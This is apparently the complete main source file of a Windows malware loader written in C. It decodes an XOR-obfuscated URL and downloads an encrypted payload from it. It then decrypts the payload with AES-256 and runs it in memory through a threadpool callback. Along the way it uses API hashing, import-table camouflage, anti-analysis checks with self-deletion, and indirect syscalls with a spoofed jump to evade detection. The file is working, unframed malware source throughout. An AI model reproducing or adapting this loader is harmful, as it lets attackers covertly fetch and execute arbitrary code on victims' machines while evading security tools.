#include "Common.h"
#include "ctaes.h"
#include "IatCamouflage.h"
#include <stdio.h>

API_HASHING g_Api = { 0 };
DWORD SyscallId = 0;
LPVOID spoofJump;
HMODULE hKernel32;
HMODULE hNtdll;

void FetchAesKeyAndIv(PBYTE ctAesKey, PBYTE ctAesIv) {

    for (int i = 0; i < IV_SIZE; i++) {
        ctAesIv[i] -= 0x03;
    }
    for (int i = 0; i < KEY_SIZE; i++) {
        ctAesKey[i] -= 0x03;
    }
    for (int i = 0; i < IV_SIZE; i++) {
        ctAesIv[i] ^= (BYTE)ctAesKey[0];
    }
    for (int i = 1; i < KEY_SIZE; i++) {
        for (int j = 0; j < IV_SIZE; j++) {
            ctAesKey[i] ^= (BYTE)ctAesIv[j];
        }
    }
}

void XorByInputKey(const LPCWSTR szString, LPWSTR szResult, const PBYTE bKey, const SIZE_T sKeySize) {

    size_t wStringSize = wcslen(szString);

    for (size_t i = 0, j = 0; i < wStringSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }

        szResult[i] = szString[i] ^ bKey[j];
    }

    szResult[wStringSize] = L'\0';
}


int main()
{
    LPCWSTR szUrl = L"luwr>.,366-2*1-3+qb{hnbf*cjl";
    WCHAR szModifiedUrl[MAX_LENGTH];
    BYTE key[] = { 0x04, 0x01, 0x03, 0x02 };
    SIZE_T keySize = sizeof(key);

    PBYTE pPayloadBytes;
    SIZE_T sPayloadSize;

    PVOID ctPayload = NULL;
    PVOID ptPayload = NULL;
    DWORD dwptPayloadSize = NULL;
    BYTE ctAesKey[KEY_SIZE] = { 0 };
    BYTE ctAesIv[IV_SIZE] = { 0 };
    AES256_CBC_ctx	CtAesCtx = { 0 };

    IatCamouflage();

    hNtdll = GetModuleHandleH(NTDLLDLL_JOAA);
    hKernel32 = GetModuleHandleH(KERNEL32DLL_JOAA);
    spoofJump = ((char*)GetProcAddressH(hNtdll, NtAddBootEntry_JOAA)) + 18;

    if (!AntiAnalysis(20000)) {
        DeleteSelf();
        ExitProcess(-1);
        return -1;
    }

    LoadLibraryH("wininet");

    XorByInputKey(szUrl, szModifiedUrl, key, keySize);

    GetPayloadFromUrl((LPCWSTR)szModifiedUrl, &pPayloadBytes, &sPayloadSize);

    ctPayload = (PVOID)((ULONG_PTR)pPayloadBytes + KEY_SIZE + IV_SIZE);
    dwptPayloadSize = sPayloadSize - (KEY_SIZE + IV_SIZE);

    _memcpy(ctAesKey, pPayloadBytes, KEY_SIZE);
    _memcpy(ctAesIv, (PVOID)((ULONG_PTR)pPayloadBytes + KEY_SIZE), IV_SIZE);

    FetchAesKeyAndIv(ctAesKey, ctAesIv);

    AES256_CBC_init(&CtAesCtx, ctAesKey, ctAesIv);
    AES256_CBC_decrypt(&CtAesCtx, ctPayload, dwptPayloadSize, &ptPayload);
    
    g_Api.pCreateEventA = (fnCreateEventA)GetProcAddressH(hKernel32, CreateEventA_JOAA);
    HANDLE c = g_Api.pCreateEventA(NULL, FALSE, TRUE, NULL);

    LPVOID currentVmBase = NULL;
    SIZE_T szWmResv = dwptPayloadSize;

    GetSyscallId(hNtdll, &SyscallId, ZwAllocateVirtualMemory_JOAA);
    setup(SyscallId, spoofJump);
    NTSTATUS status = executioner((HANDLE)-1,&currentVmBase, NULL,&szWmResv,MEM_COMMIT,PAGE_READWRITE);

    _memcpy(currentVmBase, ptPayload, szWmResv);

    memset(ptPayload, '\0', dwptPayloadSize);
    memset(ctPayload, '\0', sizeof(ctPayload));
    memset(ctAesKey, '\0', KEY_SIZE);
    memset(ctAesIv, '\0', IV_SIZE);

    DWORD oldProt;
    GetSyscallId(hNtdll, &SyscallId, NtProtectVirtualMemory_JOAA);
    setup(SyscallId, spoofJump);
    status = executioner((HANDLE)-1,&currentVmBase, &szWmResv,PAGE_EXECUTE_READ,&oldProt);

    HANDLE hThread = NULL;
    g_Api.pTpAllocWait = (fnTpAllocWait)GetProcAddressH(hNtdll, TpAllocWait_JOAA);
    status = g_Api.pTpAllocWait((TP_WAIT**)&hThread, (PTP_WAIT_CALLBACK)currentVmBase, NULL, NULL);

    g_Api.pTpSetWait = (fnTpSetWait)GetProcAddressH(hNtdll, TpSetWait_JOAA);
    g_Api.pTpSetWait((TP_WAIT*)hThread, c, NULL);

    GetSyscallId(hNtdll, &SyscallId, NtWaitForSingleObject_JOAA);
    setup(SyscallId, spoofJump);
    status = executioner(c, 0, NULL);

    ExitProcess(0);
    return 0;
}
